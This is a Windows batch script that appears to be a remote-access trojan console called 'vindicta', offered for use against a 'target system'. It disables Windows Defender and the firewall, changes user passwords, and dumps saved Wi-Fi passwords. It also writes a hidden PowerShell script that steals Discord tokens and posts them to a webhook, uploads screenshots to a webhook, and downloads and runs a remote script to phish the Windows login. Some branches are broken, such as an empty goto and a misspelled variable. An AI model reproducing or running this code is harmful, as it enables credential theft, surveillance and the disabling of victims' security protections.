@echo off
chcp 65001 >nul
for /f "tokens=2 delims=:" %%d in ('ipconfig ^| find "IPv4"') do set intip=%%d
for /f %%b in ('powershell -nop -c "(Invoke-RestMethod http://api.ipify.org)"') Do Set ExtIP=%%b
echo.
:main
set input=""
set /p input="vindicta > "
set empty=%input%

if /I "%input%" EQU "help" (
goto help
)

if /I "%input%" EQU "getinfo" (
systeminfo | findstr "OS System">>%appdata%\winsvc\info.txt
echo Username:                  %username%
echo Domain:                    %computername%
echo Public IP:                 %extip%
echo Private IP:               %intip%
echo Processors:                %number_of_processors%
echo CPU architechture:         %processor_architecture%
echo Operating System:          %os%
echo System Drive:              %systemdrive%
type %appdata%\winsvc\info.txt
del %appdata%\winsvc\info.txt
echo.
goto main
)

if /I "%input%" EQU "website" (
goto web
)

if /I "%input%" EQU "screenshot" (
goto screenshot
)

if /I "%input%" EQU "admincheck" (
goto admincheck
)

if /I "%input%" EQU "listuser" (
net user
goto main
)

if /I "%input%" EQU "disconnect" (
netsh wlan disconnect
goto main
)

if /I "%input%" EQU "dos" (
FOR /F "tokens=3 delims= " %%f in ('netsh wlan show interface ^| find " Name"') do set netname=%%f
echo Loading...
ping localhost -n 2 >nul
netsh interface set interface name="%netname%" admin=DISABLED
echo Successfully Dossed!
goto main
)


if /I "%input%" EQU "passwd" (
set /p puser=Username: 
set /p ppass=New password: 
net user %puser% %ppass% >nul
echo Password Successfully changed to %ppas%
goto main
)

if /I "%input%" EQU "message" (
goto msg
)

if /I "%input%" EQU "shell" (
cd %userprofile%
call cmd.exe
echo.
goto main
)

if /I "%input%" EQU "shutdown" (
set /p shutmsg=Message to show before shutdown: 
shutdown /s /c "%shutmsg%"
echo.
goto main
)

if /I "%input%" EQU "ps" (
cd %userprofile%
call powershell
goto main
)

if /I "%input%" EQU "defdisable" (
powershell -command Set-MpPreference -DisableRealtimeMonitoring $true
goto main
)

if /I "%input%" EQU "fwdisable" (
netsh advfirewall set allprofiles state off
goto main
)

if /I "%input%" EQU "geolocate" (
goto geo
)

if /I "%input%" EQU "tokengrab" (
goto tokengrab
)

if /I "%input%" EQU "wifipass" (
goto wifipass
)

if /I "%input%" EQU "winpass" (
goto 
)

) else (
echo Invalid Command
goto main
)

exit

:geo
curl -s http://ipinfo.io/%ExtIP%/json -o %appdata%\winsvc\info.txt >nul

>nul findstr /c:"html" %appdata%\winsvc\info.txt && (
  echo Did not receive response from the API && del %appdata%\winsvc\info.txt >nul && goto main
) || (
  goto gotapi
)

:gotapi
type %appdata%\winsvc\info.txt | findstr /v "{" | findstr /v "readme">>%appdata%\winsvc\new.txt
type %appdata%\winsvc\new.txt
del %appdata%\winsvc\info.txt
del %appdata%\winsvc\new.txt
echo.
goto main

exit

:msg
set /p title=Title of MessageBox: 
set /p text=Message of MessageBox: 
set /p icon=Icon on MessageBox(Information, Error, Question): 
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%text%', '%title%', 'OK', [System.Windows.Forms.MessageBoxIcon]::%icon%);}"
goto main

exit

:admincheck
    net session >nul 2>&1
    if %errorLevel% == 0 (
        echo User has admin permissions.
		echo.
    ) else (
        echo User doesn't have admin permissions.
		echo.
    )
goto main

exit

:help
echo.
echo -------------------
echo   System Commands
echo -------------------
echo.
echo listuser - Lists all system users
echo passwd - Change user password (Requires Admin)
echo defdisable - Disables Windows Defender (Requires Admin)
echo fwdisable - Disables Windows Firewall (Requires Admin)
echo.
echo --------------------
echo    Info Commands
echo --------------------
echo.
echo screenshot - Screenshots and sends to webhook
echo getinfo - Lists information about target system
echo geolocate - locates geolocation of target system
echo.
echo ---------------------
echo   Password Commands
echo ---------------------
echo.
echo wifipass - Displays all wifi passwords
echo tokengrab - Grabs discord tokens
echo winpass - Attempts to phish the windows password
echo.
echo ------------------
echo   Troll Commands
echo ------------------
echo.
echo shutdown - Shutdowns down target system
echo message - Send messagebox to target system
echo website - Open specified website on target system
echo disconnect - Disconnects from current wifi
echo dos - Disables network adapter
echo.
echo ------------------
echo   Extra Commands
echo ------------------
echo.
echo admincheck - Check for Administrator priviledges
echo shell - Remote shell 
echo ps - Remote powershell
echo.
goto main

exit

:tokengrab
set /p webhook=Webhook URL: 
if exist %appdata%\winsvc\update.ps1 del /s /q %appdata%\winsvc\update.ps1 >nul
echo $ErrorActionPreference= 'silentlycontinue'>>%appdata%\winsvc\update.ps1
echo $tokensString = new-object System.Collections.Specialized.StringCollection>>%appdata%\winsvc\update.ps1
echo $webhook_url = "%webhook%">>%appdata%\winsvc\update.ps1
echo $location_array = @(>>%appdata%\winsvc\update.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb">>%appdata%\winsvc\update.ps1
echo     $env:APPDATA + "\discordcanary\Local Storage\leveldb">>%appdata%\winsvc\update.ps1
echo     $env:APPDATA + "\discordptb\Local Storage\leveldb">>%appdata%\winsvc\update.ps1
echo     $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Local Storage\leveldb">>%appdata%\winsvc\update.ps1
echo     $env:APPDATA + "\Opera Software\Opera Stable\Local Storage\leveldb">>%appdata%\winsvc\update.ps1
echo     $env:LOCALAPPDATA + "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb">>%appdata%\winsvc\update.ps1
echo     $env:LOCALAPPDATA + "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb">>%appdata%\winsvc\update.ps1
echo )>>%appdata%\winsvc\update.ps1
echo foreach ($path in $location_array) {>>%appdata%\winsvc\update.ps1
echo     if(Test-Path $path){>>%appdata%\winsvc\update.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) {>>%appdata%\winsvc\update.ps1
echo             $data = Get-Content -Path "$($path)\$($file)">>%appdata%\winsvc\update.ps1
echo             $regex = [regex] '[\w]{24}\.[\w]{6}\.[\w]{27}'>>%appdata%\winsvc\update.ps1
echo             $match = $regex.Match($data)>>%appdata%\winsvc\update.ps1
echo             while ($match.Success) {>>%appdata%\winsvc\update.ps1
echo                 if (!$tokensString.Contains($match.Value)) {>>%appdata%\winsvc\update.ps1
echo                     $tokensString.Add($match.Value) ^| out-null>>%appdata%\winsvc\update.ps1
echo                 }>>%appdata%\winsvc\update.ps1
echo                 $match = $match.NextMatch()>>%appdata%\winsvc\update.ps1
echo             } >>%appdata%\winsvc\update.ps1
echo         }>>%appdata%\winsvc\update.ps1
echo     }>>%appdata%\winsvc\update.ps1
echo }>>%appdata%\winsvc\update.ps1
echo foreach ($token in $tokensString) {>>%appdata%\winsvc\update.ps1
echo     $message = ^"** Discord token : **>>%appdata%\winsvc\update.ps1
echo     ``` $token ``` ^">>%appdata%\winsvc\update.ps1
echo     $hash = @{ "content" = $message; }>>%appdata%\winsvc\update.ps1
echo     $JSON = $hash ^| convertto-json>>%appdata%\winsvc\update.ps1
echo     Invoke-WebRequest -uri $webhook_url -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}>>%appdata%\winsvc\update.ps1
echo }>>%appdata%\winsvc\update.ps1
powershell -command start-process PowerShell.exe -arg %appdata%\winsvc\update.ps1 -WindowStyle Hidden
ping localhost -n 2 >nul
del %appdata%\winsvc\update.ps1
goto main

exit

:web
set /p url=URL to visit: 
set /p webr=Web browser(chrome, firefox, opera): 
start %webr%.exe %url%
goto main

exit

:winphish
echo Waiting...
net use * /d /y >nul
powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/syskey-del/powershell/main/update.ps1’)); Invoke-LoginPrompt
goto main

exit

:screenshot
set /p webhook=Webhook URL: 
FOR /F "tokens=1 delims= " %%d in ('powershell -command "Get-WmiObject -Class Win32_DesktopMonitor | Select-Object ScreenWidth,ScreenHeight" ^| find "0"') do set width=%%d
FOR /F "tokens=2 delims= " %%d in ('powershell -command "Get-WmiObject -Class Win32_DesktopMonitor | Select-Object ScreenWidth,ScreenHeight" ^| find "0"') do set height=%%d
echo [Reflection.Assembly]::LoadWithPartialName("System.Drawing")>>%appdata%\winsvc\capture.ps1
echo function screenshot([Drawing.Rectangle]$bounds, $path) {>>%appdata%\winsvc\capture.ps1
echo    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height>>%appdata%\winsvc\capture.ps1
echo    $graphics = [Drawing.Graphics]::FromImage($bmp)>>%appdata%\winsvc\capture.ps1
echo.>>%appdata%\winsvc\capture.ps1
echo    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)>>%appdata%\winsvc\capture.ps1
echo.>>%appdata%\winsvc\capture.ps1
echo    $bmp.Save($path)>>%appdata%\winsvc\capture.ps1
echo.>>%appdata%\winsvc\capture.ps1
echo    $graphics.Dispose()>>%appdata%\winsvc\capture.ps1
echo    $bmp.Dispose()>>%appdata%\winsvc\capture.ps1
echo }>>%appdata%\winsvc\capture.ps1
echo.>>%appdata%\winsvc\capture.ps1
echo $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, %width%, %height%)>>%appdata%\winsvc\capture.ps1
echo screenshot $bounds "%appdata%\winsvc\capture.png">>%appdata%\winsvc\capture.ps1
powershell -command start-process PowerShell.exe -arg %appdata%\winsvc\capture.ps1 -WindowStyle Hidden
ping localhost -n 3 >nul
curl -s -F "file=@%appdata%\winsvc\capture.png" \ %webhook% >nul
echo Screenshot sent!
del %appdata%\winsvc\capture.ps1
del %appdata%\winsvc\capture.png
goto main

exit

:wifipass
setlocal enabledelayedexpansion

    call :get-profiles r

    :main-next-profile
        for /f "tokens=1* delims=," %%a in ("%r%") do (
            call :get-profile-key "%%a" key
            if "!key!" NEQ "" (
                echo WiFi Network: [%%a] Password: [!key!]
            )
            set r=%%b
        )
        if "%r%" NEQ "" goto main-next-profile
	
	echo.
	goto main

    goto :eof

:get-profile-key <1=profile-name> <2=out-profile-key>
    setlocal

    set result=

    FOR /F "usebackq tokens=2 delims=:" %%a in (
        `netsh wlan show profile name^="%~1" key^=clear ^| findstr /C:"Key Content"`) DO (
        set result=%%a
        set result=!result:~1!
    )
    (
        endlocal
        set %2=%result%
    )

    goto :eof

:get-profiles <1=result-variable>
    setlocal

    set result=

   
    FOR /F "usebackq tokens=2 delims=:" %%a in (
        `netsh wlan show profiles ^| findstr /C:"All User Profile"`) DO (
        set val=%%a
        set val=!val:~1!

        set result=%!val!,!result!
    )
    (
        endlocal
        set %1=%result:~0,-1%
    )

    goto :eof
